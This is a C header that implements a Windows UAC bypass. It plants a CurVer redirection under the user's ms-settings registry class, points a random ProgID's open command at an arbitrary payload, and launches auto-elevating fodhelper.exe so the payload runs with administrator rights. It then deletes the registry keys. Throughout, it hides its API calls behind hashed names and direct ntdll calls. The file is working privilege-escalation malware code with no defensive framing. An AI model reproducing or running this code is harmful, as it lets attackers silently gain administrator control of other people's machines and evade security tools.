#ifndef CURVER_H
#define CURVER_H

#include "winapi_loader.h"
#include <shellapi.h>
#include <stdint.h>

// -------------------- Types --------------------
typedef NTSTATUS (NTAPI *NtOpenProcessToken_t)(HANDLE, ACCESS_MASK, PHANDLE);
typedef NTSTATUS (NTAPI *NtQueryInformationToken_t)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *NtCreateKey_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtSetValueKey_t)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *NtDeleteKey_t)(HANDLE);
typedef NTSTATUS (NTAPI *NtClose_t)(HANDLE);

typedef BOOL (WINAPI *ShellExecuteExW_t)(LPSHELLEXECUTEINFOW);

// -------------------- Strings --------------------
STRINGW(autoele_exe, "\\System32\\fodhelper.exe") // or ComputerDefaults.exe
STRINGW(pre, "\\Registry\\User\\")
STRINGW(classes, "\\Software\\Classes")
STRINGW(suf, "\\Software\\Classes\\ms-settings")
STRINGW(open, "open")
STRINGW(shell, "shell")
STRINGW(command, "command")
STRINGA(hx, "0123456789ABCDEF")
STRINGW(curver, "CurVer")
STRINGW(shell32_dll, "shell32.dll")

#define ntopenprocesstoken HASH("NtOpenProcessToken")
#define ntqueryinformationtoken HASH("NtQueryInformationToken")
#define ntcreatekey HASH("NtCreateKey")
#define ntsetvaluekey HASH("NtSetValueKey")
#define ntdeletekey HASH("NtDeleteKey")
#define ntclose HASH("NtClose")
#define ntwaitforsingleobject HASH("NtWaitForSingleObject")
#define shellexecuteexw HASH("ShellExecuteExW")

// -------------------- Helpers --------------------
static SIZE_T wlen_(const wchar_t *s) {
    SIZE_T n = 0;
    while (s[n]) ++n;
    return n;
}

static void wcopy_(wchar_t *dst, const wchar_t *src, size_t *j) {
    for (size_t i = 0; src[i]; i++)
        dst[(*j)++] = src[i];
}

static unsigned int u64_digits(unsigned long long v) {
    unsigned int d = 1;
    while (v >= 10) {
        v /= 10;
        d++;
    }
    return d;
}

static unsigned long long ia_to_u64(const SID* s) {
    return
        ((unsigned long long)s->IdentifierAuthority.Value[5]) |
        ((unsigned long long)s->IdentifierAuthority.Value[4] << 8)  |
        ((unsigned long long)s->IdentifierAuthority.Value[3] << 16) |
        ((unsigned long long)s->IdentifierAuthority.Value[2] << 24) |
        ((unsigned long long)s->IdentifierAuthority.Value[1] << 32) |
        ((unsigned long long)s->IdentifierAuthority.Value[0] << 40);
}

static unsigned long long sid_len(PSID sid) {
    SID* s = (SID*)sid;

    unsigned long long len = 0;

    len += 2; // "S-"
    len += u64_digits(s->Revision);
    len += 1; // '-'

    unsigned long long ia = ia_to_u64(s);

    len += u64_digits(ia);

    for (ULONG i = 0; i < s->SubAuthorityCount; i++) {
        len += 1; // '-'
        len += u64_digits(s->SubAuthority[i]);
    }

    return len;
}

static wchar_t* append_u64(wchar_t* p, unsigned long long v) {
    if (v >= 10)
        p = append_u64(p, v / 10);

    *p++ = L'0' + (v % 10);
    return p;
}

static void sid_to_string(PSID sid, wchar_t* out) {
    SID* s = (SID*)sid;
    wchar_t* p = out;

    *p++ = L'S';
    *p++ = L'-';

    p = append_u64(p, s->Revision);

    *p++ = L'-';

    unsigned long long ia = ia_to_u64(s);

    p = append_u64(p, ia);

    for (ULONG k = 0; k < s->SubAuthorityCount; k++) {
        *p++ = L'-';
        p = append_u64(p, s->SubAuthority[k]);
    }

    *p = L'\0';
}

static void guid_to_progid(wchar_t out[39]) {
    unsigned char g[16];
    uint32_t s = 0;

    uint32_t x = (uint32_t)(uintptr_t)&s;
    uint32_t y = (uint32_t)(uintptr_t)&g;

    s = x ^ (y * 0x9E3779B9u);
    if (s == 0)
        s = 2463534242u;

    unsigned char *p = g;
    /* xorshift32 */
    for (int i = 0; i < 16; ++i) {
        s ^= s << 13;
        s ^= s >> 17;
        s ^= s << 5;

        p[i] = (unsigned char)(s >> ((i & 3) * 8));
    }

    p[6] = (p[6] & 0x0F) | 0x40; // version 4
    p[8] = (p[8] & 0x3F) | 0x80; // RFC4122 variant

    int i2 = 0;
    out[i2++] = L'{';

    // Data1 (p[0..3])
    for (int i = 3; i >= 0; --i) {
        unsigned char b = p[3 - i];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'-';

    // Data2 (p[4..5])
    for (int i = 5; i >= 4; --i) {
        unsigned char b = p[9 - i];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'-';

    // Data3 (p[6..7])
    for (int i = 7; i >= 6; --i) {
        unsigned char b = p[13 - i];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'-';

    // Data4[0..1]
    for (int j = 8; j < 10; ++j) {
        unsigned char b = p[j];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'-';

    // Data4[2..7]
    for (int j = 10; j < 16; ++j) {
        unsigned char b = p[j];
        out[i2++] = hx[b >> 4];
        out[i2++] = hx[b & 0x0F];
    }

    out[i2++] = L'}';
    out[i2] = L'\0';
}

int InvokeCurVerElevation(wchar_t* payloadCmd) {
    HMODULE hNtdll = myGetModuleHandleH(ntdll_dll);

    NtOpenProcessToken_t NtOpenProcessToken = (NtOpenProcessToken_t)myGetProcAddressH(hNtdll, ntopenprocesstoken);
    NtQueryInformationToken_t NtQueryInformationToken = (NtQueryInformationToken_t)myGetProcAddressH(hNtdll, ntqueryinformationtoken);
    NtWaitForSingleObject_t NtWaitForSingleObject = (NtWaitForSingleObject_t)myGetProcAddressH(hNtdll, ntwaitforsingleobject);
    NtCreateKey_t NtCreateKey = (NtCreateKey_t)myGetProcAddressH(hNtdll, ntcreatekey);
    NtSetValueKey_t NtSetValueKey = (NtSetValueKey_t)myGetProcAddressH(hNtdll, ntsetvaluekey);
    NtDeleteKey_t NtDeleteKey = (NtDeleteKey_t)myGetProcAddressH(hNtdll, ntdeletekey);
    NtClose_t NtClose = (NtClose_t)myGetProcAddressH(hNtdll, ntclose);
    LdrLoadDll_t LdrLoadDll = (LdrLoadDll_t)myGetProcAddressH(hNtdll, ldrloadll);

    NTSTATUS status = 0;
    int result = 0;
    ULONG len = 0;

    HANDLE hToken;

    HANDLE hKey;
    HANDLE hCur;
    HANDLE hBase;
    HANDLE hProg;
    HANDLE hShell;
    HANDLE hOpen;
    HANDLE hCmd;

    NtOpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken);

    NtQueryInformationToken(hToken, TokenUser, NULL, 0, &len);

    UCHAR buffer[len];

    NtQueryInformationToken(hToken, TokenUser, buffer, len, &len);

    NtClose(hToken);

    TOKEN_USER* tu = (TOKEN_USER*)buffer;

    unsigned long long sid_chars = sid_len(tu->User.Sid);

    wchar_t sid[sid_chars + 1];
    sid_to_string(tu->User.Sid, sid);

    size_t pre_len = wlen_(pre);
    size_t suf_len = wlen_(suf);

    size_t path_len = pre_len + sid_chars + suf_len + 1;
    wchar_t path[path_len];

    size_t p = 0;
    wcopy_(path, pre, &p);
    wcopy_(path, sid, &p);
    wcopy_(path, suf, &p);
    path[p] = L'\0';

    UNICODE_STRING keyName;
    InitUnicodeString(&keyName, path);

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ULONG disp;

    status = NtCreateKey(&hKey, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &attr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);

    if (!NT_SUCCESS(status))
        return result;

    wchar_t progid[39];
    guid_to_progid(progid);

    UNICODE_STRING curKey;
    InitUnicodeString(&curKey, curver);

    OBJECT_ATTRIBUTES curAttr;
    InitializeObjectAttributes(&curAttr, &curKey, OBJ_CASE_INSENSITIVE, hKey, NULL);

    status = NtCreateKey(&hCur, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &curAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);

    if (!NT_SUCCESS(status)) {
        NtDeleteKey(hKey);
        NtClose(hKey);
        return result;
    }

    UNICODE_STRING emptyName = { 0 };

    status = NtSetValueKey(hCur, &emptyName, 0, REG_SZ, progid, (wlen_(progid) + 1) * sizeof(wchar_t));

    if (!NT_SUCCESS(status)) {
        NtDeleteKey(hCur); NtClose(hCur);
        NtDeleteKey(hKey); NtClose(hKey);
        return result;
    }

    size_t base_len = pre_len + sid_chars + wlen_(classes) + 1;
    wchar_t base[base_len];

    size_t p2 = 0;
    wcopy_(base, pre, &p2);
    wcopy_(base, sid, &p2);
    wcopy_(base, classes, &p2);
    base[p2] = L'\0';

    UNICODE_STRING baseKey;
    InitUnicodeString(&baseKey, base);

    OBJECT_ATTRIBUTES baseAttr;
    InitializeObjectAttributes(&baseAttr, &baseKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(&hBase, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &baseAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);

    if (!NT_SUCCESS(status)) {
        NtDeleteKey(hCur); NtClose(hCur);
        NtDeleteKey(hKey); NtClose(hKey);
        return result;
    }

    UNICODE_STRING progKey;
    InitUnicodeString(&progKey, progid);

    OBJECT_ATTRIBUTES progAttr;
    InitializeObjectAttributes(&progAttr, &progKey, OBJ_CASE_INSENSITIVE, hBase, NULL);

    status = NtCreateKey(&hProg, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &progAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);

    if (!NT_SUCCESS(status)) {
        NtDeleteKey(hBase); NtClose(hBase);
        NtDeleteKey(hCur);  NtClose(hCur);
        NtDeleteKey(hKey);  NtClose(hKey);
        return result;
    }

    UNICODE_STRING shellKey;
    InitUnicodeString(&shellKey, shell);

    OBJECT_ATTRIBUTES shellAttr;
    InitializeObjectAttributes(&shellAttr, &shellKey, OBJ_CASE_INSENSITIVE, hProg, NULL);

    status = NtCreateKey(&hShell, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &shellAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);

    if (!NT_SUCCESS(status)) {
        NtDeleteKey(hProg); NtClose(hProg);
        NtDeleteKey(hBase); NtClose(hBase);
        NtDeleteKey(hCur);  NtClose(hCur);
        NtDeleteKey(hKey);  NtClose(hKey);
        return result;
    }

    UNICODE_STRING openKey;
    InitUnicodeString(&openKey, open);

    OBJECT_ATTRIBUTES openAttr;
    InitializeObjectAttributes(&openAttr, &openKey, OBJ_CASE_INSENSITIVE, hShell, NULL);

    status = NtCreateKey(&hOpen, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &openAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);

    if (!NT_SUCCESS(status)) {
        NtDeleteKey(hShell); NtClose(hShell);
        NtDeleteKey(hProg);  NtClose(hProg);
        NtDeleteKey(hBase);  NtClose(hBase);
        NtDeleteKey(hCur);   NtClose(hCur);
        NtDeleteKey(hKey);   NtClose(hKey);
        return result;
    }

    UNICODE_STRING cmdKey;
    InitUnicodeString(&cmdKey, command);

    OBJECT_ATTRIBUTES cmdAttr;
    InitializeObjectAttributes(&cmdAttr, &cmdKey, OBJ_CASE_INSENSITIVE, hOpen, NULL);

    status = NtCreateKey(&hCmd, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &cmdAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);

    if (!NT_SUCCESS(status)) {
        NtDeleteKey(hOpen);  NtClose(hOpen);
        NtDeleteKey(hShell); NtClose(hShell);
        NtDeleteKey(hProg);  NtClose(hProg);
        NtDeleteKey(hBase);  NtClose(hBase);
        NtDeleteKey(hCur);   NtClose(hCur);
        NtDeleteKey(hKey);   NtClose(hKey);
        return result;
    }

    status = NtSetValueKey(hCmd, &emptyName, 0, REG_SZ, payloadCmd, (wlen_(payloadCmd) + 1) * sizeof(wchar_t));

    if (!NT_SUCCESS(status)) {
        NtDeleteKey(hCmd);  NtClose(hCmd);
        NtDeleteKey(hOpen); NtClose(hOpen);
        NtDeleteKey(hShell);NtClose(hShell);
        NtDeleteKey(hProg); NtClose(hProg);
        NtDeleteKey(hBase); NtClose(hBase);
        NtDeleteKey(hCur);  NtClose(hCur);
        NtDeleteKey(hKey);  NtClose(hKey);
        return result;
    }

    WCHAR* windir = (WCHAR*)(((BYTE*)0x7FFE0000) + 0x030); // NtSystemRoot

    size_t windir_len = wlen_(windir);
    size_t autoele_len = wlen_(autoele_exe);

    WCHAR exePath[windir_len + autoele_len + 1];

    size_t k = 0;

    wcopy_(exePath, windir, &k);
    wcopy_(exePath, autoele_exe, &k);
    exePath[k] = L'\0';

    SHELLEXECUTEINFOW sei = { 0 };
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = open;
    sei.lpFile = exePath;
    sei.nShow = SW_SHOWNORMAL;

    UNICODE_STRING ustr;
    InitUnicodeString(&ustr, shell32_dll);

    HMODULE hShell32 = NULL;
    LdrLoadDll(NULL, 0, &ustr, (PHANDLE)&hShell32);

    ShellExecuteExW_t ShellExecuteExW = (ShellExecuteExW_t)myGetProcAddressH(hShell32, shellexecuteexw);

    if (ShellExecuteExW(&sei)) {
        result = 1;
        NtWaitForSingleObject(sei.hProcess, FALSE, NULL);
        NtClose(sei.hProcess);
    }

    NtDeleteKey(hCmd);  NtClose(hCmd);
    NtDeleteKey(hOpen); NtClose(hOpen);
    NtDeleteKey(hShell);NtClose(hShell);
    NtDeleteKey(hProg); NtClose(hProg);
    NtDeleteKey(hBase); NtClose(hBase);
    NtDeleteKey(hCur);  NtClose(hCur);
    NtDeleteKey(hKey);  NtClose(hKey);

    return result;
}

#endif // CURVER_H
